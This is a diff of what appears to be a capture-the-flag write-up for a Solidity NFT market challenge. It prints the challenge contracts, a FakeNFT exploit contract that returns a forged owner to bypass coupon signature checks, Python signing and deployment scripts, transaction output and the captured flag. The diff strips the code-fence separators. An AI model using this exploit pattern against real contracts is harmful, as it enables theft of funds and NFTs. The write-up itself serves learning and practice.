@@ -520,20 +520,10 @@ contract CouponVerifierBeta {
         require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
     }
 }
-```
-
-
-
-```
 function win() external {
         require(ctfNFT.ownerOf(1) == msg.sender && ctfNFT.ownerOf(2) == msg.sender && ctfNFT.ownerOf(3) == msg.sender);
         emit SendFlag();
     }
-```
-
-
-
-```
 constructor() {
         ctfToken = new CtfToken();
         ctfToken.approve(address(this), type(uint256).max);
@@ -549,11 +539,6 @@ constructor() {
         orders.push(Order(address(ctfNFT), 2, 1337));
         orders.push(Order(address(ctfNFT), 3, 13333333337));
     }
-```
-
-
-
-```
 contract CtfToken is ERC20 {
     bool airdropped;
 
@@ -568,11 +553,6 @@ contract CtfToken is ERC20 {
         _mint(msg.sender, 5);
     }
 }
-```
-
-
-
-```
 function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
         require(!tested, "Tested");
         tested = true;
@@ -581,11 +561,6 @@ function purchaseTest(address nftAddress, uint256 tokenId, uint256 price)�
         nft.approve(address(this), tokenId);
         CtfMarket(this).purchaseOrder(orderId);
     }
-```
-
-
-
-```
 function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
         Coupon memory coupon = scoupon.coupon;
         require(coupon.user == msg.sender, "Invalid user");
@@ -601,11 +576,6 @@ function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
         _deleteOrder(coupon.orderId);
         emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
     }
-```
-
-
-
-```
 struct Coupon {
     uint256 orderId;
     uint256 newprice;
@@ -621,26 +591,11 @@ struct SignedCoupon {
     Coupon coupon;
     Signature signature;
 }
-```
-
-
-
-```
 IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
-```
-
-
-
-```
 function _deleteOrder(uint256 orderId) internal {
         orders[orderId] = orders[orders.length - 1];
         orders.pop();
     }
-```
-
-
-
-```
 function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
         require(price > 0, "Invalid price");
         require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
@@ -654,11 +609,6 @@ function isNFTApprovedOrOwner(address nftAddress, address spender, uint256�
         address owner = nft.ownerOf(tokenId);
         return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
     }
-```
-
-
-
-```
 function verifyCoupon(SignedCoupon calldata scoupon) public {
         require(!tested, "Tested");
         tested = true;
@@ -676,11 +626,6 @@ function verifyCoupon(SignedCoupon calldata scoupon) public {
         require(coupon.issuer == owner, "Invalid issuer");
         require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
     }
-```
-
-
-
-```
 bool public flag = false;
 
 function ownerOf(uint256 tokenId) public virtual returns(address) {
@@ -691,17 +636,7 @@ function ownerOf(uint256 tokenId) public virtual returns(address) {
           return market;
         }
     }
-```
-
-
-
-```
 function ownerOf(uint256 tokenId) external view returns (address owner);
-```
-
-
-
-```
 function ownerOf(uint256 tokenId) public virtual returns(address) {
         if (msg.sender==address(market)) {
             return market;
@@ -709,11 +644,6 @@ function ownerOf(uint256 tokenId) public virtual returns(address) {
             return fake_issuer;
         }
     }
-```
-
-
-
-```
 function getSerialized() public view returns (bytes32) {
         Coupon memory coupon = Coupon(
                 0, // orderId
@@ -731,11 +661,6 @@ function getSerialized() public view returns (bytes32) {
         );
         return keccak256(serialized);
     }
-```
-
-
-
-```
 from web3.auto import w3
 from web3 import Web3
 from eth_account.messages import encode_defunct, _hash_eip191_message
@@ -755,11 +680,6 @@ print("s: {}", to_32byte_hex(sign.s))
 
 ad = w3.eth.account.recoverHash(_hash, signature=sign.signature)
 print(ad)
-```
-
-
-
-```
 [+] Welcome!
 [+] sha256(g5VvvAbh+?).binary.endswith('000000000000000000')
 [-] ?=554540
@@ -782,9 +702,11 @@ ps: Option 4, use this option to get source code.
 
 You can finish this challenge in a lot of connections.
 
-^_^ geth attach http://ip:8545
+^_^ geth attach http://ip:
+8545
 
-^_^ Get Testnet Ether from http://ip:8080
+^_^ Get Testnet Ether from http://ip:
+8080
 
 [-] input your choice: 2
 [-] input your token: am6ZpsjrTJzmQMDHWxUQhxSv4C5mzeSi0EczjjLZ+DSlFwaVtmFqj2ALy2QqxqMn/ehMFY0vls/XpZ2OMQj1GkVMwZI+B83T1d30X5IV2eS96FXqi9RIFvd+yC5Wx9hN9Xbsej4ogGqztg0hH8A4EE8OxakX3Mc9gsCljsCdlS4=
@@ -792,11 +714,6 @@ You can finish this challenge in a lot of connections.
 [+] Your goal is to emit SendFlag event
 [+] Transaction hash: 0x486eb65e5e0c273d3302f0c659e8ad5c75bb85752853fb92659e247fd92c7c76
 [+] CtfMarket contract address : 0x99a4d18Ed41d62B76f97421880Ac393363b33DC0
-```
-
-
-
-```
 contract FakeNFT is Context, ERC165 {
     
     address public fake_issuer;
@@ -832,11 +749,6 @@ contract FakeNFT is Context, ERC165 {
         return address(this);
     }
 }
-```
-
-
-
-```
 contract exp {
     CtfMarket public market = CtfMarket(0x99a4d18Ed41d62B76f97421880Ac393363b33DC0);
     CtfNFT public nft = CtfNFT(0xff109547782BdDe334d5B2397936A3A14f3F9e3b);
@@ -933,11 +845,6 @@ contract exp {
         return keccak256(serialized);
     }
 }
-```
-
-
-
-```
 with open('bytecode.txt', 'r') as f:
     code = f.read()
 
@@ -959,38 +866,18 @@ tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)
 receipt = w3.eth.waitForTransactionReceipt(tx_id)
 address = receipt.contractAddress
 print(address)
-```
-
-
-
-```
 % python dev.py
 0xc7C6f3893fF863bc070630C86bBeb26Cf0a07e0d
-```
-
-
-
-```
 % python sign.py
 h: {} 0x7c9830d7479756cbc3c70f0441c4ba902d66f4587f27edce9ef0e260aa61897b
 v: {} 27
 r; {} 0x3c0690f0dbb4ef2ec42d482c58d411c04090560b292d518d660f783e2a9e0f2d
 s: {} 0x5e79e613d1653406d9d036d64ceee4971b84941adda64e85e5a964b7d22e538b
 0x206282f74534CE358Db1125793A074Bf5da06943
-```
-
-
-
-```
 python rpc.py
 True
 0x206282f74534CE358Db1125793A074Bf5da06943
 AttributeDict({'blockHash': HexBytes('0xff53d1c989e5cad76e3b9bea0af493f9e35c186346bc6be2943591c0905179e5'), 'blockNumber': 104831, 'contractAddress': None, 'cumulativeGasUsed': 36902, 'effectiveGasPrice': 1000000000, 'from': '0x206282f74534CE358Db1125793A074Bf5da06943', 'gasUsed': 36902, 'logs': [AttributeDict({'address': '0x99a4d18Ed41d62B76f97421880Ac393363b33DC0', 'topics': [HexBytes('0x23ddb4dbb8577d03ebf1139a17a5c016963c43761e8ccd21eaa68e9b8ce6a68e')], 'data': '0x', 'blockNumber': 104831, 'transactionHash': HexBytes('0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253'), 'transactionIndex': 0, 'blockHash': HexBytes('0xff53d1c989e5cad76e3b9bea0af493f9e35c186346bc6be2943591c0905179e5'), 'logIndex': 0, 'removed': False})], 'logsBloom': HexBytes('0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000800000010000000000000000000002000000000000'), 'status': 1, 'to': '0xc7C6f3893fF863bc070630C86bBeb26Cf0a07e0d', 'transactionHash': HexBytes('0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253'), 'transactionIndex': 0, 'type': '0x0'})
-```
-
-
-
-```
 [+] Welcome!
 [+] sha256(iDjT6WLv+?).binary.endswith('000000000000000000')
 [-] ?=173952
@@ -1013,12 +900,15 @@ ps: Option 4, use this option to get source code.
 
 You can finish this challenge in a lot of connections.
 
-^_^ geth attach http://ip:8545
+^_^ geth attach http://ip:
+8545
 
-^_^ Get Testnet Ether from http://ip:8080
+^_^ Get Testnet Ether from http://ip:
+8080
 
 [-] input your choice: 3
 [-]input your new token: 97zQeRnF6GYJy/ETfLMzJu6FeFag2BiP67zGUs8p+PAkGO6t7QrV+7SHAC19gM8ZT+dh9wpRiQfbXAg2rxQNKcAmNATrP+VmUP+DVaoKzzWTiYwkBQeaU6JSprqJyiKOm9BehGckozgDb+hh8YGTxFr8jpxG3pZBRNDuh35uX1HxXTSoNMUhy9AODO82S+099s+cK2BR55kNVQa4turEnw==
 [-] input tx_hash that emitted SendFlag event: 0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253
-[+] flag:flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
+[+] flag:
+flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
 ```
